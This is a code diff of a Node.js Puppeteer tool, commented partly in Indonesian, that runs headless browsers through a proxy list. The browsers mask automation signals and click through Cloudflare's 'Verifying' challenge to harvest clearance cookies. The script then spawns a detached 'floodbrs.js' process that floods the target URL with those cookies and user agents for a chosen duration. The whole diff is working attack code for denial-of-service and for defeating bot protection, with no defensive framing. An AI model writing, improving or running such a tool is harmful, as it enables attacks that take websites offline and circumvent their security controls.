@@ -13,18 +13,17 @@ const proxyFile = process.argv[4];
 const rate = process.argv[5];
 const duration = parseInt(process.argv[6]);
 
-console.log(`[ START ] Cloudflare Bypass Started - Target: ${targetURL}`);
+console.log(`[ START ] Cloudflare Bypass Started`);
+console.log(`[ TARGET ] ${targetURL}`);
 
-// Read proxies - format: ip:port
+// Read proxies
 const readProxies = (filePath) => {
     try {
         const proxies = fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
-        return proxies.map(proxy => {
-            // Clean proxy format - remove http/https if present
-            return proxy.replace(/https?:\/\//, '').trim();
-        });
+        console.log(`[ PROXY ] Loaded ${proxies.length} proxies`);
+        return proxies.map(proxy => proxy.replace(/https?:\/\//, '').trim());
     } catch (error) {
-        console.log(`[ ERROR ] Cannot read proxy file: ${error.message}`);
+        console.log(`[ ERROR ] Proxy file: ${error.message}`);
         return [];
     }
 };
@@ -37,82 +36,107 @@ const generateUserAgent = () => {
 
 // Wait functions
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-const randomSleep = (min, max) => sleep(Math.random() * (max - min) + min);
 
-// Cloudflare Cookie Class
-class CloudflareCookie {
-    constructor(cookieData) {
-        this.name = cookieData.name || "";
-        this.value = cookieData.value || "";
-        this.domain = cookieData.domain || "";
-        this.path = cookieData.path || "/";
-        this.expires = cookieData.expires || 0;
-        this.httpOnly = cookieData.httpOnly || false;
-        this.secure = cookieData.secure || false;
-        this.sameSite = cookieData.sameSite || "Lax";
-    }
-
-    static fromJSON(cookieData) {
-        return new CloudflareCookie(cookieData);
-    }
-
-    toString() {
-        return `${this.name}=${this.value}`;
-    }
-}
-
-// Find Cloudflare cookies
-const findCloudflareCookies = (cookies) => {
-    const cfCookies = cookies.filter(cookie => 
-        cookie.name.includes('cf_') || 
-        cookie.name.includes('_cf') ||
-        cookie.name === 'cf_clearance' ||
-        cookie.name === '__cf_bm'
-    ).map(cookie => CloudflareCookie.fromJSON(cookie));
-    
-    return cfCookies;
-};
-
-// Simple Cloudflare bypass - langsung click apapun yang ada
-const simpleCloudflareBypass = async (page) => {
+// Cloudflare bypass dengan waiting untuk "Verifying..."
+const cloudflareBypass = async (page) => {
     try {
-        console.log(`[ BYPASS ] Waiting for challenge page...`);
+        console.log(`[ BYPASS ] Waiting for Cloudflare challenge...`);
         
-        // Tunggu page load
-        await page.waitForFunction(() => document.readyState === 'complete');
-        await sleep(5000);
+        // Tunggu halaman load sepenuhnya
+        await page.waitForFunction(() => document.readyState === 'complete', { timeout: 30000 });
+        
+        // Cek status awal
+        const initialTitle = await page.title();
+        const initialUrl = await page.url();
+        console.log(`[ BYPASS ] Initial - Title: "${initialTitle}", URL: ${initialUrl}`);
 
-        // Cari semua element yang bisa di click
-        const clickableSelectors = [
+        // TAHAP 1: Tunggu proses "Verifying..." selesai
+        console.log(`[ BYPASS ] ⏳ Waiting for "Verifying..." to complete...`);
+        
+        let verifyingCompleted = false;
+        let attempts = 0;
+        const maxAttempts = 30; // Maksimal 30 detik waiting
+
+        while (attempts < maxAttempts && !verifyingCompleted) {
+            await sleep(1000);
+            attempts++;
+            
+            try {
+                const currentTitle = await page.title();
+                const currentUrl = await page.url();
+                
+                // Cek tanda-tanda "Verifying..." selesai:
+                // 1. Title berubah dari "Just a moment" atau "Checking"
+                // 2. URL berubah
+                // 3. Ada elemen challenge yang muncul
+                
+                const isVerifying = 
+                    currentTitle.includes('Just a moment') ||
+                    currentTitle.includes('Checking your browser') ||
+                    currentTitle.includes('Verifying') ||
+                    currentUrl.includes('challenge');
+                
+                if (!isVerifying) {
+                    console.log(`[ BYPASS ] ✅ "Verifying" completed after ${attempts}s`);
+                    verifyingCompleted = true;
+                    break;
+                }
+                
+                // Cek jika sudah ada elemen challenge yang muncul
+                const challengeElements = await page.$$([
+                    'input[type="checkbox"]',
+                    '.hcaptcha-box', 
+                    '[role="checkbox"]',
+                    '.cf-checkbox',
+                    '#challenge-stage input',
+                    'input[name="cf_captcha_kind"]',
+                    'label[for="cf-challenge-checkbox"]'
+                ].join(','));
+                
+                if (challengeElements.length > 0) {
+                    console.log(`[ BYPASS ] ✅ Challenge elements appeared after ${attempts}s`);
+                    verifyingCompleted = true;
+                    break;
+                }
+                
+                if (attempts % 5 === 0) {
+                    console.log(`[ BYPASS ] Still verifying... (${attempts}s)`);
+                }
+                
+            } catch (e) {
+                // Continue waiting
+            }
+        }
+
+        if (!verifyingCompleted) {
+            console.log(`[ BYPASS ] ❌ "Verifying" timed out after ${maxAttempts}s`);
+        }
+
+        // TAHAP 2: Handle challenge setelah "Verifying" selesai
+        console.log(`[ BYPASS ] 🔍 Looking for challenge elements...`);
+        await sleep(3000);
+
+        // Priority selectors untuk challenge Cloudflare
+        const challengeSelectors = [
             'input[type="checkbox"]',
-            'input[type="submit"]',
-            'button',
-            '.button',
-            '.btn',
-            '[role="checkbox"]',
             '.hcaptcha-box',
+            '[role="checkbox"]',
             '.cf-checkbox',
             '#challenge-stage input',
             'input[name="cf_captcha_kind"]',
-            '.verify-you-are-human',
-            '.success',
-            '.primary',
-            'a',
-            '[onclick]',
-            'label',
-            'div[style*="cursor"]'
+            'label[for="cf-challenge-checkbox"]'
         ];
 
-        console.log(`[ BYPASS ] Trying to find clickable elements...`);
+        let challengeSolved = false;
 
-        for (const selector of clickableSelectors) {
+        // Coba setiap selector
+        for (const selector of challengeSelectors) {
             try {
                 const elements = await page.$$(selector);
-                console.log(`[ BYPASS ] Found ${elements.length} elements for selector: ${selector}`);
+                console.log(`[ BYPASS ] Found ${elements.length} elements for: ${selector}`);
                 
                 for (const element of elements) {
                     try {
-                        // Check if element is visible
                         const isVisible = await page.evaluate(el => {
                             const rect = el.getBoundingClientRect();
                             const style = window.getComputedStyle(el);
@@ -124,70 +148,111 @@ const simpleCloudflareBypass = async (page) => {
                         }, element);
 
                         if (isVisible) {
-                            console.log(`[ BYPASS ] Clicking visible element: ${selector}`);
+                            console.log(`[ BYPASS ] 🎯 Clicking visible challenge: ${selector}`);
                             
                             // Scroll ke element
                             await page.evaluate(el => {
                                 el.scrollIntoView({ behavior: 'smooth', block: 'center' });
                             }, element);
                             
-                            await sleep(1000);
+                            await sleep(2000);
                             
                             // Click element
-                            await element.click({ delay: 50 });
-                            console.log(`[ BYPASS ] Successfully clicked: ${selector}`);
+                            await element.click({ delay: 100 });
+                            console.log(`[ BYPASS ] ✅ Successfully clicked challenge`);
                             
-                            await sleep(8000);
-                            
-                            // Check if challenge solved
-                            const title = await page.title();
-                            const url = await page.url();
-                            
-                            if (!title.includes('Just a moment') && 
-                                !title.includes('Checking your browser') &&
-                                !url.includes('challenge')) {
-                                console.log(`[ BYPASS ] Challenge solved after clicking: ${selector}`);
-                                return { success: true };
-                            }
+                            challengeSolved = true;
+                            await sleep(8000); // Tunggu setelah click
+                            break;
                         }
                     } catch (clickError) {
-                        console.log(`[ BYPASS ] Failed to click element: ${clickError.message}`);
-                        continue;
+                        console.log(`[ BYPASS ] Click failed: ${clickError.message}`);
                     }
                 }
+                if (challengeSolved) break;
             } catch (selectorError) {
                 continue;
             }
         }
 
-        // Jika semua gagal, coba reload dan tunggu
-        console.log(`[ BYPASS ] No clickable elements worked, waiting for auto-redirect...`);
-        await sleep(15000);
+        // Jika belum solved, coba click tombol verify
+        if (!challengeSolved) {
+            console.log(`[ BYPASS ] 🔍 Looking for verify buttons...`);
+            
+            const buttonSelectors = [
+                'button[type="submit"]',
+                'input[type="submit"]',
+                '.button',
+                '.btn',
+                '.verify-you-are-human',
+                '[value="Verify"]',
+                '[value="Submit"]'
+            ];
 
-        // Final check
-        const title = await page.title();
-        const url = await page.url();
+            for (const selector of buttonSelectors) {
+                try {
+                    const elements = await page.$$(selector);
+                    for (const element of elements) {
+                        try {
+                            const isVisible = await page.evaluate(el => {
+                                const rect = el.getBoundingClientRect();
+                                return rect.width > 0 && rect.height > 0;
+                            }, element);
+
+                            if (isVisible) {
+                                console.log(`[ BYPASS ] 🎯 Clicking button: ${selector}`);
+                                await element.click({ delay: 100 });
+                                console.log(`[ BYPASS ] ✅ Button clicked`);
+                                challengeSolved = true;
+                                await sleep(8000);
+                                break;
+                            }
+                        } catch (e) {
+                            continue;
+                        }
+                    }
+                    if (challengeSolved) break;
+                } catch (e) {
+                    continue;
+                }
+            }
+        }
+
+        // Final check - tunggu proses completion
+        console.log(`[ BYPASS ] ⏳ Waiting for final verification...`);
+        await sleep(10000);
+
+        const finalTitle = await page.title();
+        const finalUrl = await page.url();
         
-        const isSuccess = !title.includes('Just a moment') && 
-                         !title.includes('Checking your browser') &&
-                         !title.includes('Please wait') &&
-                         !url.includes('challenge');
+        console.log(`[ BYPASS ] Final - Title: "${finalTitle}", URL: ${finalUrl}`);
 
-        return { success: isSuccess };
+        const isSuccess = !finalTitle.includes('Just a moment') && 
+                         !finalTitle.includes('Checking your browser') &&
+                         !finalTitle.includes('Verifying') &&
+                         !finalUrl.includes('challenge');
+
+        if (isSuccess) {
+            console.log(`[ BYPASS ] 🎉 Challenge SOLVED successfully!`);
+            return { success: true };
+        } else {
+            console.log(`[ BYPASS ] ❌ Challenge may not be solved`);
+            return { success: false };
+        }
 
     } catch (error) {
-        console.log(`[ BYPASS ] Error: ${error.message}`);
+        console.log(`[ BYPASS ] 💥 Error: ${error.message}`);
         return { success: false };
     }
 };
 
-// Process each browser
-const processBrowser = async (proxy, index, total) => {
+// Process browser
+const processBrowser = async (proxy, index) => {
     let browser;
     try {
         const userAgent = generateUserAgent();
         
-        console.log(`[ THREAD ${index} ] Starting with proxy: ${proxy || 'DIRECT'}`);
+        console.log(`\n[ THREAD ${index} ] 🚀 Starting with proxy: ${proxy}`);
         
         const args = [
             '--no-sandbox',
@@ -198,22 +263,12 @@ const processBrowser = async (proxy, index, total) => {
             '--ignore-certificate-errors',
             '--ignore-ssl-errors',
             '--disable-web-security',
-            '--disable-features=site-per-process',
             '--disable-blink-features=AutomationControlled',
-            '--window-size=1920,1080',
+            '--window-size=1280,720',
             `--user-agent=${userAgent}`,
-            '--disable-accelerated-2d-canvas',
-            '--no-zygote',
-            '--disable-background-timer-throttling'
+            `--proxy-server=http://${proxy}`
         ];
 
-        // Add proxy if available
-        if (proxy && proxy.trim()) {
-            args.push(`--proxy-server=${proxy}`);
-            console.log(`[ THREAD ${index} ] Using proxy: ${proxy}`);
-        }
-
-        // Launch browser
         browser = await puppeteer.launch({
             headless: true,
             args: args,
@@ -222,94 +277,71 @@ const processBrowser = async (proxy, index, total) => {
         });
 
         const page = await browser.newPage();
-        
-        // Set viewport
-        await page.setViewport({ 
-            width: 1920, 
-            height: 1080,
-            deviceScaleFactor: 1
-        });
+        await page.setViewport({ width: 1280, height: 720 });
 
-        // Basic stealth
+        // Stealth
         await page.evaluateOnNewDocument(() => {
-            // Override webdriver
-            Object.defineProperty(navigator, 'webdriver', {
-                get: () => undefined,
-            });
-            
-            // Override plugins
-            Object.defineProperty(navigator, 'plugins', {
-                get: () => [1, 2, 3, 4, 5],
-            });
-            
-            // Override languages
-            Object.defineProperty(navigator, 'languages', {
-                get: () => ['en-US', 'en'],
-            });
-            
-            // Mock chrome
-            window.chrome = {
-                runtime: {},
-            };
+            Object.defineProperty(navigator, 'webdriver', { get: () => false });
         });
 
-        // Set realistic headers
-        await page.setExtraHTTPHeaders({
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'cache-control': 'no-cache',
-            'pragma': 'no-cache'
-        });
-
-        console.log(`[ THREAD ${index} ] Navigating to target...`);
+        console.log(`[ THREAD ${index} ] 🌐 Navigating to target...`);
         
-        // Navigate dengan timeout yang lebih longgar
         try {
             await page.goto(targetURL, { 
                 waitUntil: 'domcontentloaded',
-                timeout: 120000
+                timeout: 45000
             });
         } catch (navError) {
-            console.log(`[ THREAD ${index} ] Navigation timeout, continuing anyway...`);
+            console.log(`[ THREAD ${index} ] ⚠️ Navigation warning: ${navError.message}`);
         }
 
-        // Solve Cloudflare
-        console.log(`[ THREAD ${index} ] Solving Cloudflare challenge...`);
-        const bypassResult = await simpleCloudflareBypass(page);
+        // Check if page loaded
+        const currentUrl = await page.url();
+        if (currentUrl.startsWith('chrome-error://')) {
+            console.log(`[ THREAD ${index} ] ❌ Page failed to load`);
+            await browser.close();
+            return { success: false };
+        }
+
+        console.log(`[ THREAD ${index} ] ✅ Page loaded: ${currentUrl}`);
+
+        // Execute bypass
+        const bypassResult = await cloudflareBypass(page);
         
         if (!bypassResult.success) {
-            console.log(`[ THREAD ${index} ] Bypass failed, closing browser...`);
+            console.log(`[ THREAD ${index} ] ❌ Bypass failed`);
             await browser.close();
             return { success: false };
         }
 
-        // Get success data
+        // Get cookies
         const title = await page.title();
-        const currentUrl = await page.url();
         const cookies = await page.cookies();
-        const cfCookies = findCloudflareCookies(cookies);
         
-        console.log(`[ THREAD ${index} ] Title: ${title}`);
-        console.log(`[ THREAD ${index} ] URL: ${currentUrl}`);
-        console.log(`[ THREAD ${index} ] Found ${cfCookies.length} Cloudflare cookies`);
+        const cfCookies = cookies.filter(cookie => 
+            cookie.name.includes('cf_') || 
+            cookie.name.includes('_cf') ||
+            cookie.name === 'cf_clearance' ||
+            cookie.name === '__cf_bm'
+        );
 
+        console.log(`[ THREAD ${index} ] Found ${cfCookies.length} Cloudflare cookies`);
+        
         if (cfCookies.length === 0) {
-            console.log(`[ THREAD ${index} ] No Cloudflare cookies found`);
+            console.log(`[ THREAD ${index} ] ❌ No Cloudflare cookies found`);
             await browser.close();
             return { success: false };
         }
 
-        const cookieString = cfCookies.map(cookie => cookie.toString()).join('; ');
+        const cookieString = cfCookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
         
-        // Clean up browser
         await browser.close();
 
-        // SUCCESS LOG
-        console.log(`[ SUCCESS ] Total Solve : ${index} | Title : ${title} | proxy : ${proxy} | useragent : ${userAgent} | cookies : ${cookieString} |`);
+        // SUCCESS
+        console.log(`\n[ SUCCESS ] Total Solve : ${index} | Title : ${title} | proxy : ${proxy} | useragent : ${userAgent} | cookies : ${cookieString} |`);
         console.log(`[ SPAWN ] Flood with cookies : ${cookieString} : useragent : ${userAgent}`);
 
-        // Start flood attack
+        // Start flood
         try {
             const floodProcess = spawn('node', [
                 'floodbrs.js',
@@ -321,28 +353,19 @@ const processBrowser = async (proxy, index, total) => {
                 cookieString,
                 userAgent,
                 'cf-cookie'
-            ], {
-                detached: true,
-                stdio: 'ignore'
-            });
+            ], { detached: true, stdio: 'ignore' });
             
             floodProcess.unref();
-            console.log(`[ THREAD ${index} ] Flood process started`);
+            console.log(`[ THREAD ${index} ] ✅ Flood process started`);
         } catch (spawnError) {
-            console.log(`[ THREAD ${index} ] Failed to spawn flood process: ${spawnError.message}`);
+            console.log(`[ THREAD ${index} ] ❌ Flood error: ${spawnError.message}`);
         }
 
         return { success: true };
         
     } catch (error) {
-        console.log(`[ THREAD ${index} ] Critical error: ${error.message}`);
-        if (browser) {
-            try {
-                await browser.close();
-            } catch (closeError) {
-                // Ignore close errors
-            }
-        }
+        console.log(`[ THREAD ${index} ] 💥 Critical error: ${error.message}`);
+        if (browser) await browser.close();
         return { success: false };
     }
 };
@@ -351,21 +374,17 @@ const processBrowser = async (proxy, index, total) => {
 const main = async () => {
     const proxies = readProxies(proxyFile);
     if (proxies.length === 0) {
-        console.log(`[ ERROR ] No valid proxies found in file: ${proxyFile}`);
-        process.exit(1);
+        console.log(`[ ERROR ] No proxies available`);
+        return;
     }
 
-    console.log(`[ INFO ] Loaded ${proxies.length} proxies from ${proxyFile}`);
-    console.log(`[ INFO ] Target URL: ${targetURL}`);
-    console.log(`[ INFO ] Threads: ${threads}`);
-    console.log(`[ INFO ] Duration: ${duration} seconds`);
-    console.log(`[ INFO ] Rate: ${rate}`);
-
+    console.log(`[ INFO ] Using first ${threads} proxies`);
+    
     let successCount = 0;
     let failCount = 0;
 
     for (let i = 0; i < Math.min(proxies.length, threads); i++) {
-        const result = await processBrowser(proxies[i], i + 1, proxies.length);
+        const result = await processBrowser(proxies[i], i + 1);
         
         if (result.success) {
             successCount++;
@@ -373,39 +392,37 @@ const main = async () => {
             failCount++;
         }
 
-        console.log(`[ STATS ] Success: ${successCount} | Failed: ${failCount} | Total: ${successCount + failCount}`);
+        console.log(`[ STATS ] ✅ Success: ${successCount} | ❌ Failed: ${failCount}`);
         
         // Delay antara threads
         if (i < Math.min(proxies.length, threads) - 1) {
-            const delay = 10000 + Math.random() * 5000;
-            console.log(`[ INFO ] Waiting ${Math.round(delay/1000)} seconds before next thread...`);
+            const delay = 10000;
+            console.log(`[ WAIT ] Pausing for ${delay/1000}s...`);
             await sleep(delay);
         }
     }
 
-    console.log(`[ FINAL ] Completed! Success: ${successCount}, Failed: ${failCount}`);
-    console.log(`[ INFO ] Waiting for flood attacks to complete...`);
-    
-    // Tunggu sampai duration selesai
-    await sleep(duration * 1000 + 30000);
-    console.log(`[ END ] All processes finished`);
+    console.log(`\n[ FINAL ] 🏁 Completed! Success: ${successCount}, Failed: ${failCount}`);
+    console.log(`[ INFO ] ⏳ Waiting ${duration}s for floods...`);
+    await sleep(duration * 1000);
+    console.log(`[ END ] ✅ All processes finished`);
 };
 
-// Handle process exit
+// Error handling
 process.on('SIGINT', () => {
-    console.log(`[ INFO ] Process interrupted by user`);
+    console.log(`\n[ INFO ] Process interrupted`);
     process.exit(0);
 });
 
 process.on('uncaughtException', (error) => {
-    console.log(`[ UNCAUGHT ERROR ] ${error.message}`);
+    console.log(`[ UNCAUGHT ] ${error.message}`);
 });
 
 process.on('unhandledRejection', (error) => {
-    console.log(`[ UNHANDLED REJECTION ] ${error.message}`);
+    console.log(`[ REJECTION ] ${error.message}`);
 });
 
-// Start the main process
+// Start
 main().catch(error => {
     console.log(`[ MAIN ERROR ] ${error.message}`);
     process.exit(1);
